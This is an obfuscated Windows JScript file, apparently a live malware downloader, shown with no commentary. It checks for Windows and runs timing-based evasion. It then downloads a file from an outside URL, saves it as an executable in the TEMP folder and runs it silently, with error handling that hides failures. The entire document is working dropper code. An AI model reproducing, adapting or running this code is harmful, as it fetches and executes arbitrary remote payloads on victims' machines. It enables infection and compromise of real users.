var _ZN = false;
var _Q0 = "CreateObject";
var _LP = function _Q() {return WScript[_Q0]("WScript"+".Shell");}(), _UZ = 11;
var _DW = "MSXML2.XMLHTTP";
var _G = 2123213;
var _P = 0;
function _W(_X){_LP["Run"](_X, _P, _P);};
function _BP(){return _DW + "";};
function _K(_B0, _XK){_P = _P * 1; return _B0 - _XK;};
function _HV(){return _Q0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _ZN = true;
  @end
@*/
if (_ZN)
{
var _Z = "";
function _L(){return 22;};
var _A = 0; var _G0 = 0;
function _UV()
{
var _ND = new this["Date"]();
var _NS = _ND["getUTCMilliseconds"]();
WScript["Sleep"](_L());
var _ND = new this["Date"]();
var _T = _ND["getUTCMilliseconds"]();
WScript["Sleep"](_L());
var _ND = new this["Date"]();
var _BR = _ND["getUTCMilliseconds"]();
var _A = "_H";
_A = _K(_T, _NS);
var _G0 = "_B";
_G0 = _K(_BR, _T);
_Z = "open";
return _K(_A, _G0);
}
var _MH = false;
var _P0 = false;
for (var _HV0 = _P; _HV0 < _L() * 1; _HV0++){if (_UV() != _P){
_MH = true; 
_G0 = "31" + 11 * _A + _G0; 
_P0 = true; 
break;
}}
function _DA() {return ((_MH == true) && (_MH == _P0)) ? 1 : _P;};
if (_MH && _DA() && _P0){
function _U() {return _LP["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Y7cFuBaOhFV.ex" + "e";};
 _N = _BP();
 _S = WScript[_Q0](_N);
 var _SX = 1;
 while (_SX){
try {
	if (_SX == 1)
	{
		_S[_Z]("GET", "http://pro.monbento.com/n3iska", false);
		_S["send"]();
		_HL = "Sleep";
	}
	WScript[_HL](_L() + 120); 
	if (_S["readystate"] < 2 * 2) continue;
	_SX = _P;
	function _OO(_U0) {var _F = (1, 2, 3, 4, 5, _U0); return _F;};
	_J = WScript[_HV()]("ADODB.Stream");
	_N = _J;
	_N[_Z]();
	_N["type"] = _OO(1);
	_N["write"](_S["ResponseBody"]);
	_J["position"] = _OO(_P);
	_N["Save" + "ToFile"](_U(), 2);
	_J["cl"+"ose"]();
	_YB = _U();
	_W(_YB);
} catch(_F0){};
}
}
}

